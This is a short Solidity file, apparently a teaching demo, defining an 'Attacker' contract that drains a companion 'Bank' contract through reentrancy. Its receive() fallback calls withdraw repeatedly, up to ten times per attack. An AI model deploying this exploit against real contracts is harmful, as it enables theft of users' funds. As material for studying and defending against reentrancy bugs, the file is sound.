// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./TheDAO-Bank.sol";

contract Attacker {
    address pitifulBankAddress;
    uint256 constant totalAttackCount = 10;
    uint256 count = 0;

    constructor(address _pitifulBankAddress) payable {
        pitifulBankAddress = _pitifulBankAddress;
    }

    function depositToBank() payable external {
        Bank bank = Bank(pitifulBankAddress);
        bank.deposit{value: 1 ether}();
    }

    function withdrawFromBank() external {
        Bank bank = Bank(pitifulBankAddress);
        bank.withdraw();
    }

    receive() payable external {
        count++;
        if(count != totalAttackCount) {
            Bank bank = Bank(pitifulBankAddress);
            bank.withdraw();
        }
    }
}